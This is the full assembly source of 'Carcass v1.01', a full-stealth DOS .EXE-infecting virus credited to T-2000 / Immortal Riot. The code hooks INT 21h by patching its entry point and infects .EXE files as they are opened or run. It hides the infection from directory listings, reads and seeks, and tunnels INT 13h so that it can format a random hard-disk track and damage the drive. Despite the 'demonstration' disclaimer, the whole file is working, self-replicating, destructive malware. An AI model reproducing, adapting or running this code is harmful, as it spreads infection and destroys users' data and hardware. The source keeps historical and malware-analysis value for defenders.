   ;============================================================================
   ;
   ;
   ;      NAME: Carcass v1.01
   ;      TYPE: Full-stealth .EXE-infector.
   ;       CPU: 286+
   ;      SIZE: Around 1800 bytes.
   ;      DATE: September 1999 - December 1999.
   ;    AUTHOR: T-2000 / Immortal Riot.
   ;    E-MAIL: T2000_@hotmail.com
   ;
   ;  FEATURES:
   ;
   ;       - Full-stealth (network-compatible).
   ;       - Splices INT 21h.
   ;       - Tunnels INT 13h with signatures.
   ;       - Random track-mutilation.
   ;
   ; This was written for demonstration-purposes only, hence the lack of
   ; many things standard in the average virus. The virus goes resident by
   ; overwriting the INT 21h entrypoint with a JMP FAR to the actual virus-ISR.
   ; This works both in plain DOS and in Win9x DOS-boxes, as the virus will
   ; store it's TSR-code in an reserved section of the BIOS. I've seen very
   ; few virii that incorporate full-stealth *correctly*, so you may want to
   ; take a look at these routines. Furthermore this virus has size-stealth
   ; in Win9x DOS-boxes.
   ;
   ; Win9x-systems may become rather unstable, this is because we're messing
   ; with a shared kernel, and DOS doesn't provide us any multitasking functions
   ; (ie. semaphores, mutexes, etc), so be it..
   ;
   ;============================================================================


                   .286
                   .MODEL  TINY
                   .STACK  1024
                   .CODE


   Virus_Size      EQU     (Virus_End-START)
   Virus_Size_Mem  EQU     ((Virus_End_Mem-START)+15) / 16
   Century         EQU     (100 SHL 1)


   START:

                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES

                   CALL    Get_IP

   Copyright:      DB      '[Carcass] by T-2000 / Immortal Riot', 0

   Get_IP:         POP     SI
                   SUB     SI, (Copyright-START)

                   PUSH    CS
                   POP     DS

                   MOV     AX, 0EF00h              ; Residency-check.
                   MOV     DS, AX

                   JNC     Do_Int21h

                   DB      0EAh                    ; To avoid a TBAV-flag.

   Do_Int21h:      INT     21h

                   INC     AX                      ; Already resident?
                   JNZ     Check_BIOS

                   JMP     Jump_To_Host

   Check_BIOS:     XOR     DI, DI

                   MOV     AL, DS:[DI]

                   INC     BYTE PTR DS:[DI]        ; Attempt to change a byte.

                   CMP     DS:[DI], AL             ; If it changed, it's no ROM.
                   JNE     Copy_Virus_TSR

                   XOR     CX, CX

   Attempt_Alloc:  MOV     AH, 48h                 ; Attempt to allocate memory
                   MOV     BX, Virus_Size_Mem      ; the DOS way.
                   INT     21h
                   JNC     Hide_Virus_MCB

                   DEC     CX                      ; We're in a infinite loop?
                   JNP     Jump_To_Host

                   MOV     AH, 4Ah                 ; Get amount of DOS-memory
                   MOV     BX, CX                  ; in current block (ES).
                   INT     21h

                   MOV     AH, 4Ah                 ; Resize it so there's space
                   SUB     BX, Virus_Size_Mem + 1  ; for the virus.
                   INT     21h
                   JC      Jump_To_Host

                   JMP     Attempt_Alloc

   Hide_Virus_MCB: PUSH    AX

                   DEC     AX                      ; Get MCB of allocated block.
                   MOV     DS, AX

                   MOV     DS:[DI.MCB_PSP], 0008h  ; Mark it as a system-block.

                   POP     DS

   Copy_Virus_TSR: PUSH    DS
                   POP     ES

                   MOV     CX, Virus_Size          ; Copy the virus up to the
                   CLD                             ; allocated memory.
                   SEGCS
                   REP     MOVSB

                   PUSH    ES                      ; Hop to our allocated code.
                   PUSH    (Relocated-START)
                   RETF

   Relocated:      PUSH    CS
                   POP     DS

                   MOV     WORD PTR INT_Entry_Bytes+3, CS

                   MOV     AX, 3521h               ; Grab INT 21h's address.
                   INT     21h

                   MOV     Orig_Int21h, BX         ; Save it.
                   MOV     Orig_Int21h+2, ES

                   CALL    Swap_JMP                ; Patch INT 21h's entrypoint.

                   IN      AX, 40h                 ; Get a random value.
                   XCHG    BX, AX

                   IN      AX, 40h                 ; Get another random value.

                   ADD     BX, AX                  ; Randomize.
                   JNS     Zero_Delta              ; Should we mutilate a
                   JNP     Zero_Delta              ; random track on C: ?

                   PUSH    0F000h                  ; Standard INT 13h segment.
                   POP     DS

                   XOR     SI, SI

   Find_Int13h:    CMP     SI, 0FFF0h              ; Didn't find it?
                   JA      Zero_Delta              ; Then abort the loop.

                   MOV     CS:Real_Int13h, SI      ; Store possible INT 13h.

                   LODSB                           ; Fetch next instruction.

                   CMP     AL, 0FBh                ; STI ?
                   JNE     Find_Int13h

                   CMP     DS:[SI], 0FA80h         ; CMP DL, 80h ?
                   JNE     Find_Int13h

                   IN      AX, 40h                 ; Randomize some more.
                   XOR     AX, BX

                   XCHG    CX, AX                  ; Set random track & head.
                   MOV     DH, CL

                   MOV     AH, 0Dh                 ; Reset first harddisk.
                   MOV     DL, 80h
                   CALL    Do_Real_Int13h

   ; Random track-formatting is a very effective way of getting a harddisk to
   ; detoriate at high speed. Instead of destroying actual sector-data, it
   ; mutilates track-data. Afterwards, the mutilated track may or may not be
   ; correctly interpreted by the HDD-controller.

                   MOV     AH, 05h                 ; Format random track on it.
                   CALL    Do_Real_Int13h

   Zero_Delta:     XOR     SI, SI

   Jump_To_Host:   POP     AX
                   PUSH    AX
                   ADD     AX, (256 / 16)

                   PUSH    CS
                   POP     DS

                   LES     BX, [SI+(File_Header.Program_IP-START)]

                   MOV     CX, ES
                   ADD     CX, AX

                   MOV     DS:[SI+(Host_CS-START)], CX
                   MOV     DS:[SI+(Host_IP-START)], BX

                   LES     BX, [SI+(File_Header.Program_SS-START)]

                   ADD     BX, AX

                   MOV     DS:[SI+(Host_SS-START)], BX
                   MOV     DS:[SI+(Host_SP-START)], ES

                   POP     ES                      ; Restore all registers.
                   POP     DS
                   POPA
                   POPF

                   INT     03h                     ; Flush prefetcher.

                   PUSH    0DEADh                  ; Restore host's original
   Host_SS         =       WORD PTR $-2            ; stack.
                   POP     SS
                   MOV     SP, 0DEADh
   Host_SP         =       WORD PTR $-2

                   DB      0EAh                    ; Jump to the host.
   Host_IP         =       WORD PTR $+0
   Host_CS         =       WORD PTR $+2

   File_Header:    DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      OFFSET Carrier
                   DW      0


           ; One could optimize the ISR even more by using CALL_Reg16's
           ; (2 bytes), instead of CALL_Imm16's (3 bytes) when issueing
           ; a Do_Old_Int21h.

   Virus_Int21h:
                   PUSHF

                   CMP     AX, 0EF00h              ; It's our residency-check?
                   JNE     Check_If_Hook

                   POPF

                   MOV     AX, -1                  ; If so, return our marker.

                   IRET

   Check_If_Hook:  CALL    Swap_JMP

                   CMP     AX, 4B01h               ; Load but not execute image?
                   JNE     Test_For_5700h

   Stealth_Load:   POPF

                   MOV     CS:Saved_BX, BX         ; Save BX but keep the stack.

                   CALL    Do_Old_Int21h           ; Call the function.

                   PUSHF                           ; Save all registers.
                   PUSHA
                   PUSH    DS
                   PUSH    ES
                   JC      Exit_St_Load            ; Bail on error.

                   MOV     AH, 62h                 ; Get it's PSP.
                   CALL    Do_Old_Int21h

                   LEA     AX, [BX+(256/16)]       ; AX = effective segment.

                   MOV     BX, 0DEADh              ; Get the old BX.
   Saved_BX        =       WORD PTR $-2

                   LDS     SI, ES:[BX+12h]         ; Grab it's CS:IP.

                   ; Is it actually infected?

                   MOV     CX, 'ZM'

                   CMP     DS:[SI+(File_Header.EXE_ID-START)], CX
                   JNE     Exit_St_Load

                   PUSH    ES

                   ; Get program's original CS:IP.

                   LES     DI, DWORD PTR DS:[SI+(File_Header.Program_IP-START)]

                   MOV     CX, ES                  ; Calculate loaded CS by
                   ADD     CX, AX                  ; adding effective segment.

                   ; Get program's original SS:SP.

                   LES     DX, DWORD PTR DS:[SI+(File_Header.Program_SS-START)]

                   POP     DS

                   MOV     DS:[BX+12h], DI         ; Restore original CS:IP
                   MOV     DS:[BX+12h+2], CX       ; in the parameter-block.

                   MOV     DI, ES

                   ADD     DX, AX
                   MOV     ES, DX

                   DEC     DI                      ; Simulate a PUSH.
                   DEC     DI

                   PUSH    DS:[BX+0Eh]
                   PUSH    DS:[BX+0Eh+2]

                   MOV     DS:[BX+0Eh], DI         ; Restore original SS:SP
                   MOV     DS:[BX+0Eh+2], ES       ; in the parameter-block.

                   POP     DS
                   POP     SI

                   LODSW                           ; Fix AX in the stack.
                   STOSW

   Exit_St_Load:   POP     ES

                   JMP     Exit_LFN_St

   Test_For_5700h: CMP     AX, 5700h               ; Get filedate & time?
                   JNE     Test_For_714xh

   Stealth_Date:   POPF

                   CALL    Do_Old_Int21h           ; Call the function.

                   PUSHF
                   JC      Exit_St_Date            ; Bail out if error.

                   CMP     DH, Century             ; This date is infected?
                   JB      Exit_St_Date            ; If not, bail out.

                   SUB     DH, Century             ; Restore original date.

   Exit_St_Date:   JMP     POPF_Swap_Exit

   Test_For_714xh: CMP     AX, 714Eh               ; Findfirst (LFN) ?
                   JB      Test_For_4202h

                   CMP     AX, 714Fh               ; Findnext (LFN) ?
                   JA      Test_For_4202h

           ; One can safely use 386 instructions in this routine,
           ; as it only get's called under Win9x, which requires
           ; atleast a 386+ system anyway.

                   .386

   Stealth_Size_LFN:

                   POPF

                   CALL    Do_Old_Int21h

                   PUSHF                           ; Safe the regs we're gonna
                   PUSHA                           ; change.
                   PUSH    DS
                   JC      Exit_LFN_St             ; Error? then bail out.

                   PUSH    ES                      ; DS=ES.
                   POP     DS

                   ; Get possible DOS datestamp.

                   MOV     DH, BYTE PTR DS:[DI.Win32_Date+1]

                   DEC     SI                      ; Date/time fields are in
                   JZ      Check_Stamp             ; DOS-format?

                   PUSH    SI

                   MOV     AX, 71A7h               ; If not, we need to convert
                   XOR     BL, BL                  ; them to DOS-format.
                   LEA     SI, DS:[DI.Win32_Time]
                   CALL    Do_Old_Int21h

                   POP     SI

   Check_Stamp:    SUB     DH, Century             ; Get original year-count.
                   JB      Exit_LFN_St             ; Below 2080 ?

                   ; Restore the original filesize.

                   SUB     DS:[DI.Win32_Size_Low], LARGE Virus_Size
                   SBB     DS:[DI.Win32_Size_High], 0

                   INC     SI                      ; Date/time is in DOS-format?
                   JNZ     Store_DOS_Date

                   MOV     AX, 71A7h               ; Convert date/time-stamp
                   INC     BX                      ; with the restored years-
                   LEA     DI, DS:[DI.Win32_Time]  ; count to Win32-format.
                   CALL    Do_Old_Int21h

                   JMP     Exit_LFN_St

   Store_DOS_Date: MOV     BYTE PTR DS:[DI.Win32_Date+1], DH

   Exit_LFN_St:    POP     DS
                   POPA
   POPF_Swap_Exit: POPF

                   CALL    Swap_JMP

                   RETF    2                       ; And back to the caller.

                   ; Just don't forget to switch back to
                   ; whatever mode you were using before.

                   .286

   Test_For_4202h: CMP     AX, 4202h               ; Seek EOF-relative?
                   JNE     Test_For_3Fh

   Stealth_Seek:   PUSHA

                   PUSHA

                   CALL    Check_Date              ; Is it infected?

                   POPA

                   JB      Do_St_Seek

                   SUB     DX, Virus_Size          ; Seek relative to the
                   SBB     CX, 0                   ; original file-end.
   Do_St_Seek:     CALL    Do_Old_Int21h

                   CALL    Set_Stack_Regs          ; Store DX:AX & flags.

   Exit_St_Seek:   POPA
                   POPF

                   CALL    Swap_JMP

                   IRET

   Test_For_3Fh:   PUSHA

                   XCHG    AL, AH

                   CMP     AL, 3Fh                 ; Read?
                   JNE     Test_For_3Dh

   Stealth_Read:   MOV     BP, CX                  ; Save #bytes to read in BP.
                   MOV     CS:Buffer_Offset, DX    ; Save readbuffer.

                   PUSH    AX
                   CALL    Check_Date              ; Is this handle infected?
                   POP     AX
                   JC      Test_For_3Dh

                   CALL    Save_File_Pos

                   PUSH    AX
                   PUSH    DX

                   ADD     AX, BP
                   ADC     DX, CX

                   XCHG    SI, AX                  ; DI:SI = endposition after
                   MOV     DI, DX                  ; the read.

                   CALL    Seek_EOF

                   PUSHA

                   CALL    Restore_File_Pos

                   POPA

                   SUB     AX, Virus_Size          ; DX:AX = uninfected size.
                   SBB     DX, CX

                   CMP     DI, DX
                   JB      Perform_Read
                   JA      Redirect_Read

                   CMP     SI, AX
                   JNA     Perform_Read

   Redirect_Read:  SUB     AX, CS:File_Pos_Low
                   SBB     DX, CS:File_Pos_High
                   JC      St_Set_Buffer

                   XCHG    BP, AX

   Perform_Read:   MOV     CX, BP
   St_Set_Buffer:  MOV     DX, 0
   Buffer_Offset   =       WORD PTR $-2
                   CALL    Read_File

                   POP     DI
                   POP     SI

                   CALL    Set_Stack_Regs

                   XCHG    CX, AX                  ; Zero bytes were read?
                   JCXZ    Exit_Read               ; Then skip further stealth.

                   PUSH    CX

                   CALL    Save_File_Pos

                   DEC     CX
                   LEA     DX, [-(Virus_End-File_Header)+SI]
                   CALL    Seek_EOF_Rel

                   POP     AX

                   MOV     CX, 24

                   OR      DI, DI                  ; Read was from 1st 64k ?
                   JNZ     Rest_Pos_Exit

                   CMP     SI, CX                  ; Read was from the header?
                   JNB     Rest_Pos_Exit

                   ADD     AX, SI                  ; Get end-position of read.
                   JC      Read_Clean_Hdr          ; Carry? then we're over 64k.

                   CMP     AX, CX                  ; Less than 24 bytes read?
                   JNB     Read_Clean_Hdr

                   XCHG    CX, AX                  ; Then adjust count.

   Read_Clean_Hdr: SUB     CX, SI                  ; Number of bytes to re-read.
                   MOV     DX, CS:Buffer_Offset
                   CALL    Read_File

   Rest_Pos_Exit:  CALL    Restore_File_Pos

   Exit_Read:      JMP     Exit_St_Seek

   Test_For_3Dh:   CMP     AL, 3Dh                 ; Open?
                   JE      Infect_File

   Test_For_4B00h: CMP     AX, 004Bh               ; Program execute?
                   JE      Infect_File

   Test_For_40h:   CMP     AL, 40h                 ; Write?
                   JNE     JMP_Old_Int21h

   Clean_Handle:   CALL    Check_Date              ; Check if it's infected.
                   JC      JMP_Old_Int21h

                   PUSH    DS

                   PUSH    CS
                   POP     DS

                   PUSH    CX                      ; Save it's file-date & time.
                   PUSH    DX

                   CALL    Save_File_Pos

                   DEC     CX                      ; Seek to original header.
                   MOV     DX, -(Virus_End-File_Header)
                   CALL    Seek_EOF_Rel

                   MOV     CX, 24                  ; Read the original header
                   MOV     DX, OFFSET File_Header  ; located in the viruscode.
                   CALL    Read_File

                   MOV     CX, -1                  ; Seek to the original EOF.
                   MOV     DX, -Virus_Size
                   CALL    Seek_EOF_Rel

                   INC     CX                      ; Truncate file at current
                   CALL    Write_File              ; position.

                   CALL    Seek_BOF

                   MOV     CL, 24                  ; Write the original header
                   MOV     DX, OFFSET File_Header  ; back to the file.
                   CALL    Write_File

                   CALL    Restore_File_Pos

                   PUSH    5701h                   ; Restore original date.
                   POP     AX
                   POP     DX
                   POP     CX
                   CALL    Do_Old_Int21h

                   POP     DS

   JMP_Old_Int21h: PUSH    DS
                   PUSH    ES

                   MOV     AX, 3501h               ; Grab INT 01h's address.
                   CALL    Do_Old_Int21h

                   PUSH    CS
                   POP     DS

                   MOV     Orig_Int_01h, BX        ; Save it.
                   MOV     Orig_Int_01h+2, ES

                   MOV     AH, 25h                 ; Install our own handler.
                   MOV     DX, OFFSET Tracer
                   CALL    Do_Old_Int21h

                   PUSHF
                   POP     AX

                   OR      AH, 00000001b           ; Set the TF.

                   PUSH    AX
                   POPF

                   POP     ES                      ; Restore original registers.
                   POP     DS
                   POPA
                   POPF

                   DB      0EAh                    ; JMP xxxx:xxxx opcode.
   Orig_Int21h     DW      0, 0


   Infect_File:
                   PUSH    DS
                   PUSH    ES

                   MOV     AX, 3D02h               ; Open the candidate file.
                   CALL    Do_Old_Int21h
                   JNC     Read_Header

                   JMP     Exit_Infect

   Read_Header:    PUSH    CS
                   POP     DS

                   PUSH    CS
                   POP     ES

                   XCHG    BX, AX

                   MOV     SI, OFFSET File_Header

                   MOV     CX, 24                  ; Read file's header.
                   MOV     DX, SI
                   CALL    Read_File
                   JC      JMP_Close_File

                   CMP     AX, CX                  ; Able to read it entirely?
                   JNE     JMP_Close_File

                   MOV     AX, 'ZM'

                   CMP     [SI.EXE_ID], AX         ; Verify it's an .EXE-file.
                   JNE     JMP_Close_File

                   CMP     [SI.Checksum], CX       ; Is it already infected?
                   JE      JMP_Close_File

                   CALL    Seek_EOF

                   DEC     DX                      ; File is larger than 64k ?
                   JNS     Save_Stamp

                   CMP     AX, 666                 ; Must be atleast 666 bytes.
                   JNB     Save_Stamp

   JMP_Close_File: JMP     Close_File

   Save_Stamp:     CALL    Check_Date              ; Obtain it's date & time.

                   PUSH    CX
                   PUSH    DX

                   MOV     AX, [SI.Header_Size_PG] ; Calculate it's headersize
                   MOV     CX, 16                  ; in bytes.
                   MUL     CX

                   XCHG    BP, AX                  ; DI:BP = headersize.
                   MOV     DI, DX

                   CALL    Seek_EOF

                   PUSHA

                   MOV     CX, Virus_Size          ; Append virusbody to the
                   XOR     DX, DX                  ; host.
                   CALL    Write_File

                   POPA

                   SUB     AX, BP                  ; Calculate imagesize.
                   SBB     DX, DI

                   MOV     CX, 16                  ; Calculate virus' CS:IP.
                   DIV     CX

                   MOV     [SI.Program_CS], AX     ; Set new CS:IP.
                   MOV     [SI.Program_IP], DX

                   ADD     AX, ((Virus_Size + 15) / 16)

                   MOV     [SI.Program_SS], AX     ; Set new SS:SP.
                   MOV     [SI.Program_SP], 1024

                   CALL    Seek_EOF

                   MOV     CH, (512 SHR 8)

                   PUSHA

                   DIV     CX

                   DEC     DX
                   JS      Store_Pages

                   INC     AX

   Store_Pages:    MOV     [SI.File_512_Pages], AX

                   MOV     AX, Virus_Size_Mem

   Fix_Min_Mem:    ADD     [SI.Min_Size_Mem], AX   ; Update MinMem requirements.
                   JNC     Fix_Max_Mem             ; Did it overflow?

                   SUB     [SI.Min_Size_Mem], AX   ; Then just use old value.

   Fix_Max_Mem:    ADD     [SI.Max_Size_Mem], AX   ; Update MaxMem requirements.
                   JNC     Calc_Mod_512            ; Did it overflow?

                   SUB     [SI.Max_Size_Mem], AX   ; Then just use old value.

   Calc_Mod_512:   POPA

                   SUB     AX, BP
                   SBB     DX, DI

                   DIV     CX

                   MOV     [SI.Image_Mod_512], DX

                   CALL    Seek_BOF

                   MOV     CL, 24

                   MOV     [SI.Checksum], CX       ; Infection-tag.

                   MOV     DX, SI                  ; Write back updated header.
                   CALL    Write_File

   Restore_Stamp:  PUSH    5701h                   ; Restore infected stamp.
                   POP     AX
                   POP     DX
                   POP     CX
                   ADD     DH, Century
                   CALL    Do_Old_Int21h

   Close_File:     MOV     AH, 3Eh                 ; Close the file (duh).
                   CALL    Do_Old_Int21h

   Exit_Infect:    POP     ES
                   POP     DS

                   JMP     JMP_Old_Int21h


   Read_File:
                   MOV     AH, 3Fh

                   CMP     AX, 0
                   ORG     $-2

   Write_File:     MOV     AH, 40h
                   JMP     Do_Old_Int21h

   Seek_BOF:
                   XOR     AL, AL

                   CMP     AX, 0
                   ORG     $-2

   Seek_EOF:       MOV     AL, 02h

                   MOV     AH, 42h

   Z_CX_DX_Int21h: XOR     CX, CX
                   CWD

   Do_Old_Int21h:  PUSHF
                   CALL    DWORD PTR CS:Orig_Int21h

                   RETN


   Seek_EOF_Rel:
                   MOV     AX, 4202h
                   JMP     Do_Old_Int21h


   Save_File_Pos:
                   MOV     AX, 4201h
                   CALL    Z_CX_DX_Int21h

                   MOV     CS:File_Pos_Low, AX
                   MOV     CS:File_Pos_High, DX

                   RETN


   Restore_File_Pos:

                   MOV     AX, 4200h
                   MOV     CX, 0
   File_Pos_High   =       WORD PTR $-2
                   MOV     DX, 0
   File_Pos_Low    =       WORD PTR $-2
                   JMP     Do_Old_Int21h


   Check_Date:
                   MOV     AX, 5700h
                   CALL    Do_Old_Int21h
                   JC      Exit_Chk_Date

                   CMP     DH, Century

   Exit_Chk_Date:  RETN


   Set_Stack_Regs:
                   MOV     BP, SP

                   PUSHF
                   POP     [BP+(1*2)+(11*2)]

                   MOV     [BP+(1*2)+(7*2)], AX
                   MOV     [BP+(1*2)+(5*2)], DX

                   RETN


   Do_Real_Int13h:
                   PUSHF
                   DB      9Ah                     ; CALL xxxx:xxxx opcode.
   Real_Int13h     DW      0, 0F000h

                   RETN


   Swap_JMP:
                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES

                   PUSH    CS
                   POP     ES

                   LDS     SI, DWORD PTR CS:Orig_Int21h
                   MOV     DI, (INT_Entry_Bytes-START)

                   MOV     CX, 5                   ; Five bytes to swap.

                   CLD

                   CLI

   Swap_Byte:      MOV     AL, ES:[DI]
                   XCHG    AL, DS:[SI]

                   STOSB

                   INC     SI

                   LOOP    Swap_Byte

                   POP     ES
                   POP     DS
                   POPA
                   POPF

                   RETN


   Tracer:
                   PUSHA
                   PUSH    DS

                   MOV     BP, SP

                   LDS     SI, [BP+(9*2)]          ; Grab CS:IP from the stack.

                   CMP     BYTE PTR DS:[SI], 9Dh   ; Next instruction is POPF ?
                   JNE     Check_Segment

                   ; Set TF in the pushed flags on the stack.

                   OR      BYTE PTR [BP+(9*2)+(3*2)+1], 00000001b

   Check_Segment:  MOV     AX, DS
                   MOV     BX, CS

                   CMP     AX, BX                  ; Don't do any checks while
                   JE      Exit_Tracer             ; we're still in our own CS.

                   PUSH    CS
                   POP     DS

                   MOV     CX, 16                  ; Calculate the linear CS
                   MUL     CX                      ; address.

                   XOR     BX, BX

                   ADD     AX, SI                  ; And add IP afterwards.
                   ADC     DX, BX

                   XCHG    SI, AX                  ; DI:SI = linear address of
                   MOV     DI, DX                  ; next instruction.

                   MOV     AX, Orig_Int21h+2       ; Calculate linear CS address
                   MUL     CX                      ; of the original INT 21h.

                   ADD     AX, Orig_Int21h         ; DX:AX = linear address of
                   ADC     DX, BX                  ; the original INT 21h.

                   CMP     DI, DX                  ; Check if we're below the
                   JB      Re_Swap_JMP             ; patch-bytes. If so, shove
                   JA      Check_If_Over           ; the JMP back in.

                   CMP     SI, AX
                   JB      Re_Swap_JMP

   Check_If_Over:  ADD     AX, 5
                   ADC     DX, BX

                   CMP     DI, DX                  ; Check if we're above the
                   JA      Re_Swap_JMP             ; patch-bytes.

                   CMP     SI, AX
                   JB      Exit_Tracer

   Re_Swap_JMP:    MOV     AX, 2501h               ; Restore original INT 01h.
                   LDS     DX, DWORD PTR Orig_Int_01h
                   CALL    Do_Old_Int21h

                   CALL    Swap_JMP                ; Put JMP back in.

                   ; Disable TF in the stack.

                   AND     BYTE PTR [BP+(9*2)+(2*2)+1], NOT 00000001b

   Exit_Tracer:    POP     DS
                   POPA

                   IRET


   Message DB      'Your pulverised torso languishes in it''s pool of pus', 0Dh
           DB      'Minced, cancerous viscera - gore seeps from the guts', 0Dh
           DB      'My fetid fetish is to excavate the moulding rot', 0Dh
           DB      'I drool my gastric juices as I chomp on your blood-clots', 0Dh
           DB      'Fermenting innards, bubbling with rot', 0Dh
           DB      'Alcoholic pus, dissolves the wooden box', 0Dh
           DB      'I gouge into the chest''s cavity to rip out the intestines', 0Dh
           DB      'Slivering soft entrails to release the foaming secretions', 0Dh
           DB      'I suck up the concoction and eat the decay', 0Dh
           DB      'With cankered disgorgement I excrete my gurgling prey', 0Dh
           DB      'Bile, chyme and blood in the offal effervesce', 0Dh
           DB      'I eviscerate the bowels and drink the clotted cess', 0Dh


   INT_Entry_Bytes DB      0EAh
                   DW      OFFSET Virus_Int21h
   Virus_End:
                   DW      0

   Orig_Int_01h    DW      0, 0

   Virus_End_Mem:


   Carrier:
                   MOV     AX, 4C00h
                   INT     21h


   EXE_Header      STRUC
   EXE_ID          DW      0
   Image_Mod_512   DW      0
   File_512_Pages  DW      0
   Reloc_Items     DW      0
   Header_Size_PG  DW      0
   Min_Size_Mem    DW      0
   Max_Size_Mem    DW      0
   Program_SS      DW      0
   Program_SP      DW      0
   Checksum        DW      0
   Program_IP      DW      0
   Program_CS      DW      0
   Reloc_Table     DW      0
   EXE_Header      ENDS


   Find_FN_Win32   STRUC
   Win32_Attr      DD      0
   Win32_Created   DD      0, 0
   Win32_Access    DD      0, 0
   Win32_Time      DW      0
   Win32_Date      DW      0
                   DD      0
   Win32_Size_High DD      0
   Win32_Size_Low  DD      0
   Win32_Reserved  DB      8 DUP(0)
   Win32_Win_Name  DB      260 DUP(0)
   Win32_DOS_Name  DB      14 DUP(0)
   Find_FN_Win32   ENDS


   MCB_Header      STRUC
   MCB_ID          DB      0
   MCB_PSP         DW      0
   MCB_Para_Size   DW      0
   MCB_Dunno       DB      3 DUP(0)
   MCB_Program     DW      4 DUP(0)
   MCB_Header      ENDS

                   END     START
